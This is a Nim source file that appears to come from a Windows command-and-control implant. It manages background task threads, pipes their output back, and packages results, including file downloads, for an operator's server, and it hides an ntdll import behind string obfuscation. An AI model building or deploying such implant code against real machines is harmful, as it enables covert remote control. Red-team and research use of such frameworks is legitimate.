import winim/lean
import sequtils
import ../../../types/[common, agent, protocol]
import ../../../common/[serialize, crypto, utils]
import ../protocol/result

proc NtTerminateThread(hThread: HANDLE, exitCode: NTSTATUS): NTSTATUS {.cdecl, stdcall, importc: protect("NtTerminateThread"), dynlib: protect("ntdll.dll").}

proc getResultType(job: Job): ResultType =
    case cast[CommandType](job.task.command):
    of CMD_DOWNLOAD: RESULT_BINARY
    else: RESULT_STRING

proc jobThreadEntry(lpParam: LPVOID): DWORD {.stdcall.} =
    let param = cast[ThreadParameter](lpParam)
    try:
        param.worker(param.ctx, param.hWrite, param.hStopEvent, param.task)
    except Exception as err:
        param.failed = true
        var dwBytesWritten: DWORD
        if param.hWrite != 0 and err.msg.len() > 0:
            discard WriteFile(param.hWrite, addr err.msg[0], DWORD(err.msg.len()), addr dwBytesWritten, nil)
    return 0

proc drainOutput(job: Job): seq[byte] =
    var 
        available: DWORD = 0
        bytesRead: DWORD = 0

    if PeekNamedPipe(job.hRead, nil, 0, nil, addr available, nil) == TRUE and available > 0:
        var chunk = newSeq[byte](available)
        if ReadFile(job.hRead, addr chunk[0], available, addr bytesRead, nil) == TRUE and bytesRead > 0:
            return chunk[0 ..< bytesRead]

    return @[]

proc startJob*(ctx: AgentCtx, task: Task, worker: WorkerProc): bool =
    var 
        sa: SECURITY_ATTRIBUTES
        hRead, hWrite: HANDLE
    
    sa.nLength = cast[DWORD](sizeof(SECURITY_ATTRIBUTES))
    sa.bInheritHandle = FALSE
    sa.lpSecurityDescriptor = nil

    if CreatePipe(addr hRead, addr hWrite, addr sa, 0) == FALSE:
        return false

    # Initialize event for cancelling a job
    let hStopEvent = CreateEventA(nil, TRUE, FALSE, nil)  
    if hStopEvent == 0:
        CloseHandle(hRead)
        CloseHandle(hWrite)
        return false

    var param = ThreadParameter(
        ctx: ctx,
        hWrite: hWrite,
        hStopEvent: hStopEvent,
        task: task,
        worker: worker
    )

    var threadId: DWORD
    let hThread = CreateThread(nil, 0, jobThreadEntry, cast[LPVOID](param), 0, addr threadId)
    
    if hThread == 0:
        CloseHandle(hRead)
        CloseHandle(hWrite)
        return false

    ctx.jobs.add(Job(
        task: task,
        state: JOB_RUNNING,
        hThread: hThread,
        hRead: hRead,
        hWrite: hWrite,
        hStopEvent: hStopEvent,
        threadParams: param
    ))
    
    return true

proc cancelJob*(ctx: AgentCtx, jobId: Uuid): bool =
    for job in ctx.jobs:
        if job.task.taskId == jobId:
            job.state = JOB_CANCELLED
            SetEvent(job.hStopEvent)
            return true
    return false

proc handleJobs*(ctx: AgentCtx, packer: var Packer, numResults: var int) =
    if ctx.jobs.len == 0:
        return

    for job in ctx.jobs:
        let data = job.drainOutput()
        if data.len > 0:
            var result = ctx.createTaskResult(job.task, STATUS_IN_PROGRESS, job.getResultType(), data)
            packer.addDataWithLengthPrefix(ctx.serializeTaskResult(result))
            inc numResults

        # Check if the worker thread has exited
        if job.state == JOB_RUNNING:
            var exitCode: DWORD = 0
            GetExitCodeThread(job.hThread, addr exitCode)
            if exitCode != STILL_ACTIVE:
                job.state = JOB_COMPLETED

        # Cleanup completed/cancelled jobs
        if job.state in {JOB_COMPLETED, JOB_CANCELLED}:
            let data = job.drainOutput()
            if data.len > 0:
                var result = ctx.createTaskResult(job.task, STATUS_IN_PROGRESS, job.getResultType(), data)
                packer.addDataWithLengthPrefix(ctx.serializeTaskResult(result))
                inc numResults

            # Terminate thread
            var exitCode: DWORD = 0
            GetExitCodeThread(job.hThread, addr exitCode)
            if exitCode == STILL_ACTIVE:
                discard WaitForSingleObject(job.hThread, 1000)
                GetExitCodeThread(job.hThread, addr exitCode)
                if exitCode == STILL_ACTIVE:
                    discard NtTerminateThread(job.hThread, 0)

            # Cleanup
            CloseHandle(job.hThread)
            CloseHandle(job.hStopEvent)
            if job.hWrite != 0:
                CloseHandle(job.hWrite)
            CloseHandle(job.hRead)

            # Notify the server that the task has finished
            let status = 
                if job.threadParams.failed: STATUS_FAILED
                elif job.state == JOB_CANCELLED: STATUS_CANCELLED
                else: STATUS_COMPLETED
            var result = ctx.createTaskResult(job.task, status, RESULT_NO_OUTPUT, @[])
            packer.addDataWithLengthPrefix(ctx.serializeTaskResult(result))
            inc numResults

    # Remove completed/cancelled jobs
    ctx.jobs.keepItIf(it.state == JOB_RUNNING)